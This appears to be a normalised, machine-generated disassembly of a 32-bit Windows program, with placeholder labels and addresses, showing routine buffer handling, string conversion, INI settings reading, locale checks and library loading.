sub_4010f0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov ebx ecx
mov eax [ ebx + 0x4 ]
mov esi [ ebx ]
push edi
add eax [ ebp + 0x4 ]
push eax
mov [ esp + 0x14 ] esi
call j_sub_42e3bc
mov ecx [ ebx + 0x4 ]
mov edx ecx
shr ecx 0x2
mov [ ebx ] eax
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx ]
mov edi [ ebx + 0x4 ]
mov ecx [ ebp + 0x4 ]
mov esi [ ebp ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
push ecx
call ??_V@YAXPAX@Z
mov edx [ ebp + 0x4 ]
mov eax [ ebx + 0x4 ]
add esp 0x8
pop edi
pop esi
add eax edx
pop ebp
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
retn 0x4
sub_401160
mov eax [ esp + 0x4 ]
push ebx
push esi
mov esi ecx
mov ebx [ esi ]
push edi
mov edi [ esi + 0x4 ]
cmp eax edi
jbe r-xdata
mov edx [ esi + 0x4 ]
push edx
call j_sub_42e3bc
mov [ esi ] eax
mov ecx edi
mov edi eax
mov eax ecx
shr ecx 0x2
mov esi ebx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call ??_V@YAXPAX@Z
add esp 0x8
pop edi
pop esi
pop ebx
retn 0x4
mov edx edi
mov ecx edx
shl ecx 0x1
mov edx ecx
cmp eax edx
ja r-xdata
mov [ esi + 0x4 ] edx
sub_4011c0
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_4012e0
mov eax [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x4 ]
add eax edi
cmp eax ecx
jbe r-xdata
mov eax [ esi ]
add eax edi
pop edi
pop esi
retn 0x8
push eax
mov ecx esi
call sub_401160
sub_401310
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_401340
push esi
mov esi [ ecx ]
push edi
mov edi [ ecx + 0x4 ]
mov ecx [ esi + 0x4 ]
lea eax [ edi + 0xc ]
cmp eax ecx
jbe r-xdata
mov eax [ esi ]
add eax edi
pop edi
pop esi
retn
push eax
mov ecx esi
call sub_401160
sub_401360
push 0xffffffff
push sub_42efc0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ esp + 0x28 ]
push ebx
push ebp
push esi
push edi
mov edi ecx
push eax
mov [ esp + 0x18 ] edi
mov [ edi + 0x4 ] eax
call j_sub_42e3bc
add esp 0x4
mov [ edi ] eax
xor eax eax
mov [ esp + 0x30 ] eax
mov [ edi + 0xc ] eax
mov [ edi + 0x8 ] eax
lea esi [ edi + 0x14 ]
lea ebx [ edi + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ebp edi
mov [ esi ] edi
mov ecx [ ebp + 0x4 ]
mov [ esp + 0x38 ] eax
mov eax 0xc
cmp eax ecx
jbe r-xdata
mov ebp [ ebp ]
mov ecx [ esp + 0x38 ]
push 0x21
add ebp ecx
call [ htonl@IAT ]
mov [ ebp ] eax
mov eax [ esi + 0x4 ]
mov ebp [ esi ]
mov edx [ ebp + 0x4 ]
lea ecx [ eax + 0xc ]
cmp ecx edx
mov [ esp + 0x38 ] eax
jbe r-xdata
push eax
mov ecx ebp
call sub_401160
mov ecx [ ebp ]
mov [ eax + ecx + 0x8 ] 0x0
mov eax [ esi + 0x4 ]
mov ebp [ esi ]
mov edx [ ebp + 0x4 ]
lea ecx [ eax + 0xc ]
cmp ecx edx
mov [ esp + 0x38 ] eax
jbe r-xdata
push ecx
mov ecx ebp
call sub_401160
mov eax [ esp + 0x38 ]
mov edx [ ebp ]
mov [ edx + eax + 0x4 ] 0x0
lea eax [ esp + 0x18 ]
push eax
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
mov ecx esi
call sub_4012a0
mov ecx eax
call sub_4012c0
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x30 ] 0x0
lea edx [ esp + 0x20 ]
cmp ebx edx
je r-xdata
push ecx
mov ecx ebp
call sub_401160
mov eax [ esp + 0x38 ]
mov [ ebx + 0x8 ] 0x0
mov [ esp + 0x30 ] 0xffffffff
mov ecx [ esp + 0x28 ]
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x24
retn 0x4
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] ecx
sub_4014a0
push 0xffffffff
push sub_42efd8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call ??_V@YAXPAX@Z
add esp 0x4
sub_4014e0
push 0xffffffff
push sub_42eff8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push esi
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esi + 0x14 ]
call sub_4012a0
mov ecx eax
call sub_4012c0
xor ecx ecx
mov [ esp + 0x20 ] ecx
lea eax [ esi + 0x8 ]
mov [ esp + 0x20 ] 0xffffffff
lea edx [ esp + 0x10 ]
cmp eax edx
pop esi
mov [ eax + 0x8 ] ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
mov edx [ esp + 0x4 ]
mov [ eax ] edx
mov edx [ esp + 0x8 ]
mov [ eax + 0x4 ] edx
sub_401550
push 0xffffffff
push sub_42f01b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ esp ] eax
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4015a0
push 0xffffffff
push sub_42f03b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esi + 0x20 ]
xor edi edi
cmp eax edi
je r-xdata
mov ecx [ esp + 0xc ]
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi + 0x20 ] edi
sub_401600
push 0xffffffff
push sub_42f063
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esp + 0x4 ] esi
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esp + 0x10 ] 0x1
push esi
mov [ esi ] 0x2c
call [ Ordinal_ATL71_65@IAT ]
test eax eax
jge r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] 0x1
sub_401680
push 0xffffffff
push sub_42f078
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
mov eax [ rw-data ]
push eax
push esi
call [ Ordinal_ATL71_66@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_4015a0
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401740
push 0xffffffff
push sub_42f0b3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_4017c0
push 0xffffffff
push sub_42f0e6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x220 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x1
lea eax [ esi + 0x240 ]
push eax
mov [ esi + 0x23c ] r--data
call [ InitializeCriticalSection@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401830
push 0xffffffff
push sub_42f116
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x1
lea eax [ esi + 0x240 ]
push eax
mov [ esi + 0x23c ] r--data
call [ DeleteCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x220 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4018a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_42f144
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x250
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
mov [ esp + 0x250 ] eax
mov eax [ esi + 0x14 ]
xor ebx ebx
cmp eax ebx
push edi
jne r-xdata
push r--data
lea eax [ esp + 0x30 ]
push esi
push eax
call sub_401740
add esp 0xc
mov [ esp + 0x264 ] 0x1
lea ebx [ esi + 0x1c ]
xor eax eax
mov ecx 0x7f
mov edi ebx
[ edi ]
lea ecx [ esp + 0x2c ]
stosw [ edi ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
push 0x64
push ebx
push r--data
push r--data
push r--data
call [ GetPrivateProfileStringW@IAT ]
lea ecx [ esp + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
push 0x1838
push r--data
push r--data
call [ GetPrivateProfileIntW@IAT ]
push r--data
lea ecx [ esp + 0x14 ]
push esi
push ecx
mov [ esi + 0x21c ] eax
call sub_401740
add esp 0xc
mov [ esp + 0x264 ] 0x2
push eax
lea ecx [ esi + 0x220 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x264 ] 0x1
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x264 ] 0xffffffff
lea ecx [ esp + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x25c ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x254 ]
mov eax 0x1
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ esp + 0x48 ] bx
mov ecx 0x81
lea edi [ esp + 0x4a ]
[ edi ]
mov ecx [ rw-data ]
stosw [ edi ]
push 0x104
lea eax [ esp + 0x4c ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
lea edx [ esp + 0x48 ]
push edx
call [ wcslen@IAT ]
mov edi eax
add esp 0x4
cmp edi ebx
jbe r-xdata
lea edx [ esp + 0x48 ]
push edx
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x264 ] ebx
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x264 ] 0xffffffff
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov eax 0x5c
lea eax [ esp + 0x48 ]
push eax
call [ wcslen@IAT ]
lea ecx [ edi + 0x1 ]
add esp 0x4
cmp ecx eax
jae r-xdata
cmp edi ebx
jne r-xdata
mov [ esp + edi * 2 + 0x4a ] bx
dec edi
cmp [ esp + edi * 2 + 0x48 ] ax
je r-xdata
jmp r-xdata
sub_401a70
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401aa0
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_42f15e
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
mov ecx rw-data
call sub_4017c0
push sub_433e20
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_401b10
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ FreeLibrary@IAT ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
pop esi
retn
sub_401b90
sub esp 0xc
mov eax [ rw-data ]
push esi
mov [ esp + 0xc ] eax
xor esi esi
call [ GetThreadLocale@IAT ]
push 0x7
lea ecx [ esp + 0x8 ]
push ecx
push 0x1004
push eax
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
call [ GetACP@IAT ]
pop esi
mov ecx [ esp + 0x8 ]
call sub_42e72f
add esp 0xc
retn
mov al [ esp + 0x4 ]
test al al
lea ecx [ esp + 0x4 ]
je r-xdata
movsx eax al
lea edx [ esi + esi * 4 ]
inc ecx
lea esi [ eax + edx * 2 - 0x30 ]
mov al [ ecx ]
test al al
jne r-xdata
test esi esi
jne r-xdata
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
call sub_42e72f
add esp 0xc
retn
sub_401c20
sub esp 0x118
mov eax [ rw-data ]
mov [ esp + 0x114 ] eax
lea eax [ esp ]
push eax
mov [ esp + 0x4 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ esp + 0x10 ] 0x2
jne r-xdata
mov eax sub_401b90
cmp [ esp + 0x4 ] 0x5
mov eax sub_401c10
jae r-xdata
push eax
push rw-data
call [ InterlockedExchange@IAT ]
call [ rw-data ]
mov ecx [ esp + 0x114 ]
call sub_42e72f
add esp 0x118
retn
sub_401de0
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push edi
mov edi ecx
jne r-xdata
push esi
push ebx
call [ lstrlenA@IAT ]
mov esi eax
inc esi
cmp esi 0x80
jle r-xdata
mov [ edi ] ebx
pop edi
pop ebx
retn 0x8
mov ecx [ edi ]
mov edx [ esp + 0x14 ]
push esi
push ecx
push esi
push ebx
push 0x0
push edx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ esi + esi ]
push eax
call [ malloc@IAT ]
add esp 0x4
test eax eax
mov [ edi ] eax
jne r-xdata
pop esi
pop edi
pop ebx
retn 0x8
call sub_401d40
push 0x8007000e
call sub_401d20
sub_401e50
push ebx
push ebp
mov ebp [ esp + 0xc ]
test ebp ebp
mov ebx ecx
jne r-xdata
push esi
push edi
push ebp
call [ lstrlenW@IAT ]
mov esi eax
inc esi
lea edi [ esi + esi ]
cmp edi 0x80
jle r-xdata
mov [ ebx ] ebp
pop ebp
pop ebx
retn 0x8
mov eax [ ebx ]
mov ecx [ esp + 0x18 ]
push 0x0
push 0x0
push edi
push eax
push esi
push ebp
push 0x0
push ecx
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push edi
call [ malloc@IAT ]
add esp 0x4
test eax eax
mov [ ebx ] eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
call sub_401d40
push 0x8007000e
call sub_401d20
sub_401ee0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi ecx
mov ebx [ esi + 0x4 ]
cmp eax ebx
mov ebp [ esi ]
ja r-xdata
add eax ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call j_sub_42e3bc
mov [ esi ] eax
mov edi eax
mov ecx ebx
mov eax ecx
shr ecx 0x2
mov esi ebp
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebp
[ edi ] [ esi ]
call ??_V@YAXPAX@Z
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x4
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
sub_401f40
push 0xffffffff
push sub_42f185
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ exception::~exception@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401fc0
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ FreeLibrary@IAT ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
pop esi
retn
sub_401ff0
push ebx
push esi
mov esi ecx
mov eax [ esi ]
xor ebx ebx
cmp eax ebx
jne r-xdata
pop esi
pop ebx
retn
push r--data
call [ LoadLibraryW@IAT ]
cmp eax ebx
mov [ esi ] eax
je r-xdata
push edi
mov edi [ GetProcAddress@IAT ]
push r--data
push eax
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x8 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0xc ] eax
call edi
mov [ esi + 0x10 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x14 ] eax
call edi
cmp [ esi + 0x4 ] ebx
mov [ esi + 0x18 ] eax
pop edi
je r-xdata
mov edx [ esi ]
push edx
call [ FreeLibrary@IAT ]
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
cmp [ esi + 0x8 ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
sub_4020b0
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_42f19e
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
push sub_433e40
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_402190
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] eax
call [ rw-data ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_401de0
mov eax esi
pop esi
retn 0x4
sub_4021c0
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] eax
call [ rw-data ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_401e50
mov eax esi
pop esi
retn 0x4
sub_4021f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f1be
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov cl [ rw-data ]
mov eax 0x1
test al cl
jne r-xdata
add esi 0xc
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0xc ] 0x0
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
call sub_42e6e6
add esp 0x4
mov [ esp + 0xc ] 0xffffffff
sub_402290
push esi
mov esi [ ecx ]
push edi
mov edi [ ecx + 0x4 ]
mov ecx [ esi + 0x4 ]
lea eax [ edi + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ esi ]
add eax edi
pop edi
pop esi
retn
push eax
mov ecx esi
call sub_401160
sub_4022f0
push esi
mov esi [ ecx ]
push edi
mov edi [ ecx + 0x4 ]
mov ecx [ esi + 0x4 ]
lea eax [ edi + 0x8 ]
cmp eax ecx
jbe r-xdata
mov eax [ esi ]
add eax edi
pop edi
pop esi
retn
push eax
mov ecx esi
call sub_401160
sub_402310
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x4 ]
push edi
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ edi ]
mov ecx [ ebx + eax ]
mov edx [ esp + 0x18 ]
push 0x4
lea eax [ esp + 0x10 ]
mov [ edx ] ecx
push eax
mov ecx esi
call sub_4022b0
cmp esi eax
je r-xdata
push eax
mov ecx edi
call sub_401160
pop edi
pop esi
pop ebx
add esp 0x8
retn 0x4
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
sub_402360
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x4 ]
push edi
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ edi ]
mov ecx [ ebx + eax ]
mov edx [ esp + 0x18 ]
push 0x4
lea eax [ esp + 0x10 ]
mov [ edx ] ecx
push eax
mov ecx esi
call sub_4022b0
cmp esi eax
je r-xdata
push eax
mov ecx edi
call sub_401160
pop edi
pop esi
pop ebx
add esp 0x8
retn 0x4
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
sub_4023b0
sub esp 0x8
push ebx
push ebp
push esi
push edi
push 0x4
lea eax [ esp + 0x14 ]
push eax
mov esi ecx
call sub_4022b0
mov ecx [ esp + 0x1c ]
mov ebx [ esi + 0x4 ]
mov edi [ esi ]
mov ebp [ ecx ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov edx [ edi ]
lea eax [ esp + 0x10 ]
mov [ ebx + edx ] ebp
cmp esi eax
mov eax [ esi + 0x8 ]
je r-xdata
push eax
mov ecx edi
call sub_401160
pop edi
add eax 0x4
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
sub_402410
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x4 ]
push edi
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ edi ]
mov cl [ ebx + eax ]
mov edx [ esp + 0x18 ]
push 0x1
lea eax [ esp + 0x10 ]
mov [ edx ] cl
push eax
mov ecx esi
call sub_4022b0
cmp esi eax
je r-xdata
push eax
mov ecx edi
call sub_401160
pop edi
pop esi
pop ebx
add esp 0x8
retn 0x4
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
sub_402460
sub esp 0x8
push ebx
push esi
push edi
push 0x1
lea eax [ esp + 0x10 ]
push eax
mov esi ecx
call sub_4022b0
mov ebx [ esi + 0x4 ]
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edi ]
mov al [ edx ]
mov [ ebx + ecx ] al
lea ecx [ esp + 0xc ]
cmp esi ecx
je r-xdata
push eax
mov ecx edi
call sub_401160
mov eax [ esi + 0x8 ]
inc eax
pop edi
mov [ esi + 0x8 ] eax
pop esi
pop ebx
add esp 0x8
retn 0x4
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
mov [ esi ] edx
mov [ esi + 0x4 ] eax
sub_4024c0
mov edx [ esp + 0x4 ]
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
mov ecx [ edi + 0x4 ]
add esi edx
lea eax [ esi + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ edi ]
pop edi
add eax esi
pop esi
retn 0x4
push eax
mov ecx edi
call sub_401160
sub_4024f0
sub esp 0x8
push ebx
push ebp
push esi
push edi
push 0x4
lea eax [ esp + 0x14 ]
push eax
mov esi ecx
call sub_4022b0
mov ecx [ esp + 0x1c ]
mov ebx [ esi + 0x4 ]
mov edi [ esi ]
mov ebp [ ecx ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov edx [ edi ]
lea eax [ esp + 0x10 ]
mov [ ebx + edx ] ebp
cmp esi eax
mov eax [ esi + 0x8 ]
je r-xdata
push eax
